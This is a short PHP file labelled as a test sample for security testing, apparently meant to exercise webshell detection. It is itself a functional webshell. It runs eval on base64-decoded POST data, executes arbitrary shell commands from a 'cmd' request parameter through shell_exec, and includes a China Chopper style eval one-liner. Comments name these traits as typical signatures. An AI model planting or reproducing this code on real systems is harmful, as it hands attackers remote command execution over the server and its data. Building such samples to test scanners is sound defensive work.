<?php
// [TEST SAMPLE] PHP Webshell - FOR SECURITY TESTING ONLY
// Typical characteristics: eval + base64_decode + $_POST
@eval(base64_decode($_POST['payload']));
$cmd = $_REQUEST['cmd'];
if (isset($cmd)) {
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
// China Chopper style one-liner signature
@eval($_POST['password']);
?>
